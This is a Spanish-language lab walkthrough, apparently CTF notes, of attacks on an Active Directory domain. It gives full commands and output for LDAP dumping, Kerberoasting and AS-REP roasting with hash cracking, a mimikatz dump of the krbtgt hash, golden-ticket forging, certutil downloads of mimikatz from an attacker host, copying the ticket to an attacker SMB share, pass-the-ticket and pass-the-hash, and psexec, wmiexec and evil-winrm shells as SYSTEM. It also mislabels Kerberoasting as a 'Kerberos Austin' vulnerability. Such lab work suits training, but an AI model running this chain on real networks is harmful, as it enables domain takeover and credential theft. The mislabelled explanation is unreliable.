        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      mié, 31 dic 1969 19:00:00 -05
        Logoff Time              :      mié, 31 dic 1969 19:00:00 -05
        Kickoff Time             :      mié, 31 dic 1969 19:00:00 -05
        Password last set Time   :      mar, 31 ene 2023 23:07:02 -05
        Password can change Time :      mié, 01 feb 2023 23:07:02 -05
        Password must change Time:      mié, 13 sep 30828 21:48:05 -05
        unknown_2[0..31]...
        user_rid :      0x455
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

### ldapdomaindump
ldapdomaindump es una herramienta de seguridad informática que se utiliza para realizar un escaneo y obtener información de un servidor de directorio LDAP (Lightweight Directory Access Protocol). Con ldapdomaindump, un atacante o auditor de seguridad puede recopilar información importante sobre la estructura del directorio, incluyendo usuarios, grupos, políticas de seguridad y otros datos sensibles.

Esta información puede ser extraida y visualidada desde servidor web, en formato html
``` java
┌──(root㉿kali)-[/var/www/html]
└─# python3 /opt/ldapdomaindump/ldapdomaindump.py -u 'labstizonal.local\utest' -p 'Password1' 192.168.200.155
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

┌──(root㉿kali)-[/var/www/html]
└─# ls -la                      
drwxr-xr-x root root 4.0 KB Tue Jan 31 23:43:44 2023  .
drwxr-xr-x root root 4.0 KB Wed Jan  4 16:29:35 2023  ..
.rw-r--r-- root root 757 B  Tue Jan 31 23:42:29 2023  domain_computers.grep
.rw-r--r-- root root 1.9 KB Tue Jan 31 23:42:29 2023  domain_computers.html
.rw-r--r-- root root  10 KB Tue Jan 31 23:42:29 2023  domain_computers.json
.rw-r--r-- root root 2.2 KB Tue Jan 31 23:42:29 2023  domain_computers_by_os.html
.rw-r--r-- root root  10 KB Tue Jan 31 23:42:29 2023  domain_groups.grep
.rw-r--r-- root root  17 KB Tue Jan 31 23:42:29 2023  domain_groups.html
.rw-r--r-- root root  80 KB Tue Jan 31 23:42:29 2023  domain_groups.json
.rw-r--r-- root root 263 B  Tue Jan 31 23:42:29 2023  domain_policy.grep
.rw-r--r-- root root 1.1 KB Tue Jan 31 23:42:29 2023  domain_policy.html
.rw-r--r-- root root 5.2 KB Tue Jan 31 23:42:29 2023  domain_policy.json
.rw-r--r-- root root  71 B  Tue Jan 31 23:42:29 2023  domain_trusts.grep
.rw-r--r-- root root 828 B  Tue Jan 31 23:42:29 2023  domain_trusts.html
.rw-r--r-- root root   2 B  Tue Jan 31 23:42:29 2023  domain_trusts.json
.rw-r--r-- root root 2.3 KB Tue Jan 31 23:42:29 2023  domain_users.grep
.rw-r--r-- root root 7.5 KB Tue Jan 31 23:42:29 2023  domain_users.html
.rw-r--r-- root root  20 KB Tue Jan 31 23:42:29 2023  domain_users.json
.rw-r--r-- root root  17 KB Tue Jan 31 23:42:29 2023  domain_users_by_group.html
.rw-r--r-- root root 615 B  Wed Jan  4 18:06:26 2023  index.nginx-debian.html
```                                                                                                                                                           
### Herberos Austin Attcaks
La vulnerabilidad de Kerberos Austin es una vulnerabilidad en el protocolo Kerberos que permite a un atacante obtener acceso no autorizado a recursos protegidos en una red. Esta vulnerabilidad se produce cuando se utiliza un servidor de autenticación KDC que no es seguro y puede ser comprometido por un atacante.

- Configurar el dns del equipo `DC` en el equipo atacante.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# echo "192.168.200.155 labstizonal.local labstizonal DC-TIZonal" >> /etc/hosts
```
Con GetUserSPNs.py, no necestiamos conocer credenciales con privilegios, con usuario del `AD`, podemos extraer a usuarios con SPN
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# GetUserSPNs.py labstizonal.local/utest:Password1 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName               Name  MemberOf                                                         PasswordLastSet             LastLogon 
---------------------------------  ----  ---------------------------------------------------------------  --------------------------  ---------
labstizonal.local/udev.DC-TIZonal  udev  CN=Group Policy Creator Owners,CN=Users,DC=labstizonal,DC=local  2023-01-31 22:20:50.958034  <never>   
```
Con el parametro `-request`, podemos extraer el hashs `TGS`
``` java        
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# GetUserSPNs.py labstizonal.local/utest:Password1 -request
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName               Name  MemberOf                                                         PasswordLastSet             LastLogon 
---------------------------------  ----  ---------------------------------------------------------------  --------------------------  ---------
labstizonal.local/udev.DC-TIZonal  udev  CN=Group Policy Creator Owners,CN=Users,DC=labstizonal,DC=local  2023-01-31 22:20:50.958034  <never>   

$krb5tgs$23$*udev$LABSTIZONAL.LOCAL$labstizonal.local/udev.DC-TIZonal*$ec803688f0a04aee6cfcc70d2c00d374$1bfd0321e221d2dda93375c4b9db6f701ab4964cdb3de4ca8f7e171f4dfd1ae73e9dbe72dfda604f12068a2f0fc1ce428f9204313e9aab8ef5ac386216eda4df8ec2858d96b2213a138f6b8fa395e2cf5791b37635f06388fe5d2be376faca339cf22efb83f41367f870e06e8b6a76cc09fdee9ddfb68d19ce4b4f73888ebd654d88d64eaf89edea35d502d6125e3fd2ef8dfdef3493627f53c34499a8435ae22262df5a5e0e0c59ff6958cb2f5d8698dbcc58b18c13406db2e1ad2094df339ddc57c9a5f6782409eab5dbdecf44a9d61a0235696e73cfb09f68fa9cea3555a00aa4b3addc922c92a5deaf9402d0726b4856ab0179c37f8f09de18b3dc63d0097de1d528175adc6b9b51398bf3a3bfe8036b5f50a973d53d553374885ecf8262843994393ae881e1b50e404bcd644e3d14683dfb00caf3779c4bee950bc49e13dd5146e28c2f7110c2bc43bb7c380f73826f6cc61bc88000381276a22a83010e42c00ae26edce0f182bb5c8f24d354c1550b158fd02d8550b7bd0b6ca93df0c672820adda809ba31ff66b1f097b19e087d8727e72d3e08c2d4958ac1c752b936559200c9d202fb923628f07b314e52d6928d0db028664781fba6b3c1a1c2a058eaf85348eed052e860ffdb08d6f7c876d4a26638061de388a8395b952b9d08007295146cd29997dbacc4ba7143432a8114e17d107fbec1856249661b52fe6edfcdd5c38e3b7a8e63ef1df20f66d7eb0d74cdc8e8c2db2add98512a2a385f19f69bcdfe12925bf06068b8eec3b833b8442a5d4ebc5d4b6234051b5524951f24383006fc260aabafec2e251456217f1953c70dce222b9c521b6857ec376c9ec0996bf22a7d3eae01f21745b462124173eedd99b7ca286997582022126467b070a75835c5f4c4af63720a9a365821e217533e60c32adc1846f51de9406ba5c1c7881097f5c8a3746935bead7eaafacbf09d0c8aabc87e67b2f41f4ae49d89c35d8219690d79e49d3a6e78a7a2da294d759403c65fa75c48399276d31d1fd52d11e21dbf47cfd80ac72e26ca638eb7abd5bc4dc3b8c6c956c24f45fcdf1eef4dfa2d487df140419e1b5a3f42aa153133bb8ce141d1f9e8735f4b4dad60d53c837fed9fdb0a55cfb8712b1c50c5d6bd2ac9fdb5d1e561993e32a085668504d2e9e91849dbecb66733d64c48439b72ffc45e232d3063aa4a97eeaeb76f2912bc320c53e41c1940ae6896c4f46f2a51422fb9858417dcc856891986e38ca3235c1b088eb177f0e9e9a1c6049559b726815030c664bc70656081944ba04a70514d0594b55267ea87e47076fcfbe26809223148af455e45d6b92f31ed1755fa375d0a12
```
Con el  hash extraido podemos ejecutar ataque de diccionario para verificar si la contraseña es debil `P@ssw0rd123(?)`.

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt tgshash                             
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd123      (?)     
1g 0:00:00:08 DONE (2023-02-01 00:30) 0.1204g/s 1296Kp/s 1296Kc/s 1296KC/s PAK2530..P1nkr1ng
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Kerberos ASREP-Roasting
"AS-Rep Roasting" es un tipo de ataque a un sistema de autenticación basado en Kerberos. Este ataque explota una vulnerabilidad en la forma en que el protocolo de autenticación maneja las respuestas a las solicitudes de autenticación (AS-REP, por sus siglas en inglés) para obtener información confidencial sobre el sistema y prepararse para futuros ataques. 

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# GetNPUsers.py labstizonal.local/ -no-pass -usersfile users
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User utest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User uprod doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$udev@LABSTIZONAL.LOCAL:141189e40400f96aeb49fbf6577e51dc$6a053c754ef3b1c8f3cdadf682cb022da7395a3ce5add53420a97a1c63b35dc4a1ddef50eb76991fb2b86858bb5eec81524abd1fb0473c14d4b47aa132195b15eca76cc155b45b6a1d60a987788c002ca597d04db9d4a863d8fc415facdda77d3f17d9461043d056d75ef3a410ad40ca6213c665e0c61c86c07bc0e29e7a3003ec64efe81277293afd7b4c6be21a1aa1e1b681accfa34990fef23a7839d584fd9e872f40a0f3f36be708c5cb1a412fda6161219d94936b4b23ef03d9b10fb4e5232471be6d993667f7ea1074e2cb5cad74e8abbfb9ec20e3346d042b452d52c97105ab41f51774e2f615e50b94bd577709cb4847e02a
[-] User svc_sqlservice doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Con la ejecución de `GetNPUsers.py`, se puede extraer el hash aprovechando la vulnerabilidad ASREP, y con john podemos ejecutar un ataque de diccionario.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt asREPhashs 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd123      ($krb5asrep$23$udev@LABSTIZONAL.LOCAL)     
1g 0:00:00:11 DONE (2023-02-01 16:52) 0.08880g/s 955793p/s 955793c/s 955793C/s PAK2530..P1nkr1ng
Use the "--show" option to display all of the cracked passwords reliably
```
### Ataque GoldenTicket 

Con mimikatz.exe creamos el golden ticket, esto sebe ejecutar en el servidor de AD, previo a esto debe estar mimikatz en el servidor DC.
- Dumpear el ticket del usuatio `krbtgt`

``` java
mimikatz # lsadump::lsa /inject /name:krbtgt  
Domain : LABSTIZONAL / S-1-5-21-158823103-3766334468-2747506326

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 507823cf6c1ca8ea1b5c72b4739a889a
    LM   : 
  Hash NTLM: 507823cf6c1ca8ea1b5c72b4739a889a
    ntlm- 0: 507823cf6c1ca8ea1b5c72b4739a889a
    lm  - 0: 6f2ef49d05357aed084afca2dd019621

 * WDigest
    01  14690de38ae8008ba9f8bf5e52c78639
    02  b128f283302dd9f8672d9a203fd9825d
    03  618d000123574f757f1c163a94eb657d
    04  14690de38ae8008ba9f8bf5e52c78639
    05  b128f283302dd9f8672d9a203fd9825d
    06  cbd067c5432df1e9107f263943849d64
    07  14690de38ae8008ba9f8bf5e52c78639
    08  b8b5c308aaa9c71bb2daefe30f2c158f
    09  b8b5c308aaa9c71bb2daefe30f2c158f
    10  38e37817715e3d4596f636ba2683b3e9
    11  e32a50c8373b38e1fd0a92bbf54d6bfa
    12  b8b5c308aaa9c71bb2daefe30f2c158f
    13  706a27aa787f1dcb0037a7989bf64038
    14  e32a50c8373b38e1fd0a92bbf54d6bfa
    15  c0f9b07280b30179ffe9a514c6879659
    16  c0f9b07280b30179ffe9a514c6879659
    17  ba29993f71c8ce7324e456e141c32d7e
    18  b5dc8f74db5f66962b67b8231ea8ecbb
    19  2c98105f320818fdabde8207122fddab
    20  cc0add3dde66ab2a9038053d17e04867
    21  8ad6face72b6635b458ef1d20ea81f0b
    22  8ad6face72b6635b458ef1d20ea81f0b
    23  e909d0cd10ba7592f901c50fd3d67a28
    24  93a0009d1ccad46b6c00af0c5da774c8
    25  93a0009d1ccad46b6c00af0c5da774c8
    26  8ec35413d5efd615daff2d390e7287e9
    27  9fbad8546cf42607efd69edd362f2fc2
    28  aca049efcba1b26f30c2d1256fadd536
    29  bb6e26cf9d25302ed7c09f33c30e055c

 * Kerberos
    Default Salt : LABSTIZONAL.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 54e6fd4925679b5d

 * Kerberos-Newer-Keys
    Default Salt : LABSTIZONAL.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5fdeaca4b6d423325dfd340bc74ce2378b2acf8db5b59c3afe6151a73c5d60dc
      aes128_hmac       (4096) : 82e0ed4a0a6a52b5f1b500a750a7ee62
      des_cbc_md5       (4096) : 54e6fd4925679b5d

 * NTLM-Strong-NTOWF
    Random Value : f2aa7bdbea737886894d2b6863ab475e
```

-  Generamos un archivo golden.kirby
> - */S-1-5.-* Corresponde al SID del dominio.
> - *rc4.-* Corresponde al hash NTLM
> - */user.-* Nombre del usuario
``` java
mimikatz # kerberos::golden /domain:labstizonal.local /S-1-5-21-158823103-3766334468-2747506326 /rc4:507823cf6c1ca8ea1b5c72b4739a889a /user:Administrator /ticket:golden.kirbi
User      : Administrator
Domain    : labstizonal.local
ServiceKey: 507823cf6c1ca8ea1b5c72b4739a889a - rc4_hmac_nt      
Lifetime  : 2/1/2023 5:30:17 PM ; 1/29/2033 5:30:17 PM ; 1/29/2033 5:30:17 PM
-> Ticket : golden.kirbi

 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```
#### Copiar un archivo desde un windows
Para copiar el archivo desde generado desde un equipo windows podemos utilizar la herramienta impacket-smbserver, para generar un recurso compartido.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# impacket-smbserver smbfolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Incoming connection (192.168.200.155,61302)
[*] AUTHENTICATE_MESSAGE (LABSTIZONAL\DC-TIZONAL$,DC-TIZONAL)
[*] User DC-TIZONAL\DC-TIZONAL$ authenticated successfully
[*] DC-TIZONAL$::LABSTIZONAL:aaaaaaaaaaaaaaaa:51021a43688177212a14c12ee833642f:0101000000000000001255aa9136d9016af4fde3fe53b0b2000000000100100049004e004b0044004a004a0054006d000300100049004e004b0044004a004a0054006d000200100066006c00760075004f00560077005a000400100066006c00760075004f00560077005a0007000800001255aa9136d90106000400020000000800300030000000000000000000000000400000e973d82f29973891c4d2374e0ae9d2c8d751716d18dd840af19c78fcb16bf1c90a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200300030002e00310034003700000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbfolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbfolder)
[*] Closing down connection (192.168.200.155,61302)
[*] Remaining connections []
```

Copiamos el archivo desde windows hacia el recurso compartido.
``` java
C:\Windows\Temp\Test>dir
 Volume in drive C has no label.
 Volume Serial Number is 3063-D095

 Directory of C:\Windows\Temp\Test

02/01/2023  05:30 PM    <DIR>          .
02/01/2023  05:30 PM    <DIR>          ..
02/01/2023  05:30 PM               822 golden.kirbi
02/01/2023  05:04 PM         1,355,264 mimikatz.exe
               2 File(s)      1,356,086 bytes
               2 Dir(s)  38,729,506,816 bytes free

C:\Windows\Temp\Test>copy golden.kirbi \\192.168.200.147\smbfolder
        1 file(s) copied.
```
#### PATH de TICKECT
- Descarga de mimikatz y Golden.kirby en el Equipo Víctima
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# psexec.py labstizonal.local/Administrator:P@ssw0rd@192.168.200.158 cmd.exe
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 192.168.200.158.....
[*] Found writable share ADMIN$
[*] Uploading file nuzkTVnz.exe
[*] Opening SVCManager on 192.168.200.158.....
[*] Creating service HktM on 192.168.200.158.....
[*] Starting service HktM.....
[!] Press help for extra shell commands
Microsoft Windows [Versión 10.0.19044.1288]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
C:\Windows\Temp\Test>certutil.exe -f -urlcache -split http://192.168.200.147:8000/mimikatz.exe mimikatz.exe
****  En lφnea  ****
  000000  ...
  14ae00
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\Test>certutil.exe -f -urlcache -split http://192.168.200.147:8000/golden.kirbi golden.kirbi
****  En lφnea  ****
  0000  ...
  0336
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\Test>dir
 El volumen de la unidad C no tiene etiqueta.
 El número de serie del volumen es: 5E60-A380

 Directorio de C:\Windows\Temp\Test

01/02/2023  09:04 p. m.    <DIR>          .
01/02/2023  09:04 p. m.    <DIR>          ..
01/02/2023  09:04 p. m.               822 golden.kirbi
01/02/2023  09:03 p. m.         1,355,264 mimikatz.exe
               2 archivos      1,356,086 bytes
               2 dirs  23,920,689,152 bytes libres

C:\Windows\Temp\Test>

```
- Con mimikatz ejecutamos con kerberos un path de ticket
``` java
C:\Windows\Temp\Test>mimikatz
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt golden.kirbi
 
* File: 'golden.kirbi': OK

mimikatz # 
```
- Ya una vez cargado el golden kirbi podemos ejecutar path directory `dir \\DC-TIZonal\c$`
#### Ticketer.py
creamos el archivo `.ccache`
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# ticketer.py -nthash 507823cf6c1ca8ea1b5c72b4739a889a -domain-sid S-1-5-21-158823103-3766334468-2747506326 -domain labstizonal.local Administrator 
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for labstizonal.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```
Creamos la variable global `KRB5CCNAME` con la ruta del archivo ccache creado.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# export KRB5CCNAME="/home/s3cur1ty3c/CTF/AD/Administrator.ccache"
```
Una vez creado la variable global ejecutamos `psexec.py` sin contraseñas, cabe recordar que una vez que se ejecuta este ataque no importa si cambian la contraseña, el ataque es persistente.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# psexec.py -n -k labstizonal.local/Administrator@DC-TIZonal cmd.exe        
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on DC-TIZonal.....
[*] Found writable share ADMIN$
[*] Uploading file DeYfRDKv.exe
[*] Opening SVCManager on DC-TIZonal.....
[*] Creating service QJMF on DC-TIZonal.....
[*] Starting service QJMF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```


Falta desde el minuto 22.

## Ejecución de shell reversa.
Cuando se tiene credenciales conocidas se puede utilizar la herramienta psexec.py
### psexec.py
`psexec.py` es un script en Python que permite ejecutar comandos y programas en un sistema remoto usando el protocolo Microsoft's PSExec, cabe recalcal que en el caso de que las contraseñas tienen carcteres como `$`, toca escaparlos quedarían asi `\$`.
``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# psexec.py labstizonal.local/Administrator:P@ssw0rd@192.168.200.155 cmd.exe
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 192.168.200.155.....
[*] Found writable share ADMIN$
[*] Uploading file xFkJjVcf.exe
[*] Opening SVCManager on 192.168.200.155.....
[*] Creating service IXtr on 192.168.200.155.....
[*] Starting service IXtr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
	nt authority\system
C:\Windows\system32>
```

### wmiexec.py
`wmiexec.py` es una herramienta de línea de comandos incluida en la suite de herramientas de pentest "Impacket". Esta herramienta permite a los pentesters ejecutar comandos en un sistema Windows remoto mediante la ejecución de una sesión WMI (Windows Management Instrumentation). Esta herramienta permite hacer path de hashes, osea conectarse sin saber las credenciales.
``` java
wmiexec.py labstizonal.local/utest@192.168.200.158 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```
### winrm Puerto 5985
WinRM (Windows Remote Management) es un protocolo de administración remota para sistemas operativos Windows. Permite a un administrador o a una aplicación realizar tareas remotas, incluyendo la ejecución de scripts, en un equipo remoto que ejecuta Windows. WinRM también es compatible con el protocolo de seguridad Kerberos, lo que significa que las solicitudes remotas se pueden autenticar y cifrar para proteger la privacidad y la integridad de los datos.

``` java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/AD]
└─# evil-winrm -u 'udev' -p 'P@ssw0rd123' -i 192.168.200.155

*Evil-WinRM* PS C:\Users\udev\Documents> whoami
labstizonal\udev
*Evil-WinRM* PS C:\Users\udev\Documents> 
```
